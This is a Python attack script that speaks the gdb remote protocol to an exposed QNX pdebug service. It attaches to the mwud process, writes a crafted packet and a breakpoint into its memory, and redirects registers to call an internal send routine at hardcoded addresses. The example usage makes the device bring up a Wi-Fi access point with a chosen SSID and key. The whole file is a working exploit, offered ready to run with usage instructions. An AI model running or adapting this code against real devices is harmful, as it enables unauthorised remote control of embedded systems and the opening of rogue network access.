#!/usr/bin/env python3
"""mwu-gdb.py — minimal gdb-remote client for QNX pdebug; injects a function
call (mwud's internal send wrapper @0x12b090) to emit a command datagram to
mwud itself. Speaks only the ancient packet set pdebug understands.

Usage: ./mwu-gdb.py <host> <port> <pid> <srcfd> <dst_ip> <dst_port> [kv...]
 e.g.  ./mwu-gdb.py 192.168.0.17 80 675948 5 127.0.0.1 9196 \
          module=mwpamod iface=uap0 cmd=ap_init ssid=NBTAA-DIRECT \
          key=1234567890 auth=0020 encrypt=0008
"""
import socket, struct, sys, time

HOST, PORT, PID, SRCFD = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
DST_IP, DST_PORT = sys.argv[5], int(sys.argv[6])
kv = [a if a.endswith('\n') else a+'\n' for a in sys.argv[7:]]
if not any(a.startswith('module=') for a in kv): kv.insert(0, 'module=mwpamod\n')
body = ''.join(kv).encode()
pkt = struct.pack('<II', len(body), 0) + body

SENDTO = 0x12b090            # mwud internal send wrapper (fd,buf,len,fl,sa,sl)
SCRATCH = 0x195768           # mwud .bss start (writable; pick mid offset)
PKT_ADDR = SCRATCH + 0x800   # well inside .bss, away from live data
SA_ADDR  = PKT_ADDR + len(pkt) + 16
BKPT_ADDR = PKT_ADDR + len(pkt) + 48  # .bss is executable on old QNX ARM

def cksum(b): return sum(b) & 0xff
class RSP:
    def __init__(s, host, port):
        s.f = socket.create_connection((host, port), 10); s.f.settimeout(10)
    def tx(s, p):
        raw = p.encode() if isinstance(p, str) else p
        s.f.sendall(b'$' + raw + b'#%02x' % cksum(raw))
    def rx(s, t=10):
        s.f.settimeout(t); buf = b''
        while True:
            c = s.f.recv(4096)
            if not c: raise IOError('eof')
            buf += c
            # find a complete $...#xx frame (skip '+'/'-' acks)
            i = buf.find(b'$')
            if i >= 0:
                j = buf.find(b'#', i)
                if j >= 0 and len(buf) >= j+3:
                    return buf[i+1:j]
    def ask(s, p, t=10):
        s.tx(p); return s.rx(t)

r = RSP(HOST, PORT)
print('attach:', r.ask(f'vAttach;{PID:x}'))
# read all regs (ARM: r0-15,cpsr packed little-endian hex)
gregs = r.ask('g')
n = len(gregs)//2
print(f'regs: {n} bytes')
saved = gregs
regs = [int.from_bytes(bytes.fromhex(gregs[i*8:i*8+8]), 'little') for i in range(n//4)]
print('  pc=%08x sp=%08x lr=%08x' % (regs[15], regs[13], regs[14]))

# memory writes: packet, sockaddr, breakpoint opcode
sa = bytes([0,2]) + struct.pack('!H', DST_PORT) + bytes(int(x) for x in DST_IP.split('.')) + b'\x00'*8
r.ask(f'M{PKT_ADDR:x},{len(pkt)}:{pkt.hex()}')
r.ask(f'M{SA_ADDR:x},{len(sa)}:{sa.hex()}')
r.ask(f'M{BKPT_ADDR:x},4:7000e120')   # bkpt #0  (0xE1200070 LE)

# stack args: sa_ptr @ [sp-16], sa_len @ [sp-12]  (2 stack args)
newsp = regs[13] - 32
stk = struct.pack('<II', SA_ADDR, 16)
r.ask(f'M{newsp:x},8:{stk.hex()}')

# set regs: r0=fd r1=pkt r2=len r3=flags sp=newsp lr=bkpt pc=sendto
nr = regs[:]
nr[0], nr[1], nr[2], nr[3] = SRCFD, PKT_ADDR, len(pkt), 0
nr[13], nr[14], nr[15] = newsp, BKPT_ADDR, SENDTO
G = ''.join(f'{v:08x}' for v in nr)   # reg block hex (LE words, same layout as g)
print('set regs:', r.ask('G'+G))

# continue -> hits bkpt after sendto returns
r.tx('c')
stop = r.rx(20)
print('stop:', stop[:60])
res = r.ask('g')
rregs = [int.from_bytes(bytes.fromhex(res[i*8:i*8+8]),'little') for i in range(len(res)//8)]
print('  ret r0=%08x pc=%08x' % (rregs[0], rregs[15]))

# restore original regs and detach cleanly
print('restore:', r.ask('G'+saved))
r.tx('c'); time.sleep(0.3)
try: print('detach:', r.ask('D', 5))
except Exception as e: print('detach:', e)
